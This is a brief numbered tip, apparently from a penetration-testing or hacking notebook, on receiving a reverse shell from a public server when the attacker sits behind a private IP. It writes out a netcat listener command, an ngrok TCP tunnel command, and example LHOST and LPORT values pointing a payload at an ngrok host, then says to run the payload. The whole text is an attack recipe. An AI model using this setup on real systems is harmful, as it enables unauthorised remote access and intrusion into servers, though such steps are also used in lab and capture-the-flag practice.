1. When you want to get reverse shell on a public server but you are on a local computer with no port forwarding and only a private IP address you want to use ngrok.
2. First run the command to start a local listener: `nc -nlvp 4444`.
3. Next, run the following command to start ngrok and make sure to specify the same port as the previous command: `ngrok tcp 4444`.
4. Generate your payload based on the socket you get from ngrok for example: `LHOST=2.tcp.eu.ngrok.io` and `LPORT=14690`.
5. Run the payload and get the connection.
